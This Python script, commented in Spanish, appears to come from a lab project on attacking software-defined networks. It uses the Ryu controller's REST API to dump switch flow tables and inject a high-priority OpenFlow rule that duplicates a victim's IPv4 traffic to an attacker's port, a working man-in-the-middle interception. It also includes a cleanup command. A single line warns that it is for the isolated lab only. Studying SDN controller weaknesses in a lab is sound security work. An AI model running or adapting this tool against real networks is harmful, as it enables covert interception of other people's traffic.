#!/usr/bin/env python3
"""
flow_inject.py - Inyeccion de flujos OpenFlow maliciosos via API REST de Ryu (Fase 2).

Complementa el ARP Spoofing: en lugar de (o ademas de) envenenar las caches ARP,
el atacante manipula directamente la tabla de flujo del Open vSwitch a traves de
la API REST de Ryu (ryu.app.ofctl_rest) para redirigir/duplicar trafico hacia el
puerto del atacante.

Requiere que el controlador se haya lanzado con la API REST:
    REST=1 ./scripts/run_controller.sh
    # equivale a: ryu-manager controller/simple_switch_13.py ryu.app.ofctl_rest

La API REST escucha por defecto en http://<IP_RYU>:8080.

Uso:
    # Listar switches conectados (devuelve los dpid)
    python3 attack/flow_inject.py --controller 192.168.100.10 list

    # Volcar la tabla de flujo de un switch
    python3 attack/flow_inject.py --controller 192.168.100.10 dump --dpid 1

    # Inyectar un flujo malicioso: duplicar hacia el puerto del atacante
    #   todo el trafico IPv4 de la victima (10.0.0.11) ademas de su salida normal
    python3 attack/flow_inject.py --controller 192.168.100.10 inject \
        --dpid 1 --src-ip 10.0.0.11 --normal-port 2 --attacker-port 3

    # Eliminar los flujos maliciosos inyectados (limpieza)
    python3 attack/flow_inject.py --controller 192.168.100.10 clear --dpid 1

ADVERTENCIA: uso exclusivo en el laboratorio aislado del proyecto.
"""

import argparse
import json
import sys

try:
    import requests
except ImportError:
    print("[!] Falta el paquete 'requests'. Instala con: pip3 install requests")
    sys.exit(1)

# Prioridad alta para que el flujo malicioso gane al learning switch (prio 1)
MALICIOUS_PRIORITY = 100
# Cookie que marca nuestros flujos para poder borrarlos despues sin tocar los demas
MALICIOUS_COOKIE = 0x6d69746d  # "mitm"


def base_url(controller, port):
    return "http://%s:%d" % (controller, port)


def cmd_list(args):
    """Lista los switches (dpids) conectados al controlador."""
    r = requests.get(base_url(args.controller, args.port) + "/stats/switches",
                     timeout=5)
    r.raise_for_status()
    dpids = r.json()
    print("[+] Switches conectados (dpid):")
    for d in dpids:
        print("    - %d (0x%x)" % (d, d))


def cmd_dump(args):
    """Vuelca la tabla de flujo de un switch."""
    url = base_url(args.controller, args.port) + "/stats/flow/%d" % args.dpid
    r = requests.get(url, timeout=5)
    r.raise_for_status()
    print(json.dumps(r.json(), indent=2))


def cmd_inject(args):
    """
    Inyecta un flujo malicioso que ENVIA UNA COPIA del trafico de la victima al
    puerto del atacante, manteniendo el reenvio normal (MITM por duplicacion).
    """
    flow = {
        "dpid": args.dpid,
        "cookie": MALICIOUS_COOKIE,
        "priority": MALICIOUS_PRIORITY,
        "match": {
            "eth_type": 0x0800,        # IPv4
            "ipv4_src": args.src_ip,
        },
        "actions": [
            {"type": "OUTPUT", "port": args.attacker_port},  # copia al atacante
            {"type": "OUTPUT", "port": args.normal_port},    # salida legitima
        ],
    }
    url = base_url(args.controller, args.port) + "/stats/flowentry/add"
    r = requests.post(url, data=json.dumps(flow), timeout=5)
    if r.status_code == 200:
        print("[+] Flujo malicioso inyectado en dpid=%d:" % args.dpid)
        print("    match ipv4_src=%s -> OUTPUT %d (atacante) + OUTPUT %d (normal)"
              % (args.src_ip, args.attacker_port, args.normal_port))
    else:
        print("[!] Error %d: %s" % (r.status_code, r.text))


def cmd_clear(args):
    """Elimina solo los flujos marcados con nuestra cookie."""
    flow = {
        "dpid": args.dpid,
        "cookie": MALICIOUS_COOKIE,
        "cookie_mask": 0xffffffffffffffff,
    }
    url = base_url(args.controller, args.port) + "/stats/flowentry/delete"
    r = requests.post(url, data=json.dumps(flow), timeout=5)
    if r.status_code == 200:
        print("[+] Flujos maliciosos (cookie 0x%x) eliminados de dpid=%d"
              % (MALICIOUS_COOKIE, args.dpid))
    else:
        print("[!] Error %d: %s" % (r.status_code, r.text))


def main():
    parser = argparse.ArgumentParser(
        description="Inyeccion de flujos OpenFlow via API REST de Ryu (Fase 2)")
    parser.add_argument("--controller", default="192.168.100.10",
                        help="IP de la VM con Ryu (API REST)")
    parser.add_argument("--port", type=int, default=8080,
                        help="Puerto de la API REST de Ryu (por defecto 8080)")

    sub = parser.add_subparsers(dest="command", required=True)

    sub.add_parser("list", help="Listar switches conectados")

    p_dump = sub.add_parser("dump", help="Volcar la tabla de flujo")
    p_dump.add_argument("--dpid", type=int, required=True)

    p_inj = sub.add_parser("inject", help="Inyectar flujo malicioso (duplicar a atacante)")
    p_inj.add_argument("--dpid", type=int, required=True)
    p_inj.add_argument("--src-ip", required=True, help="IP de la victima a interceptar")
    p_inj.add_argument("--normal-port", type=int, required=True,
                       help="Puerto OF de salida legitima")
    p_inj.add_argument("--attacker-port", type=int, required=True,
                       help="Puerto OF donde esta conectado el atacante")

    p_clr = sub.add_parser("clear", help="Eliminar los flujos maliciosos inyectados")
    p_clr.add_argument("--dpid", type=int, required=True)

    args = parser.parse_args()

    try:
        {"list": cmd_list, "dump": cmd_dump,
         "inject": cmd_inject, "clear": cmd_clear}[args.command](args)
    except requests.exceptions.RequestException as e:
        print("[!] No se pudo contactar la API REST de Ryu en %s:%d -> %s"
              % (args.controller, args.port, e))
        print("    Asegurate de lanzar el controlador con REST=1 (ofctl_rest).")
        sys.exit(1)


if __name__ == "__main__":
    main()
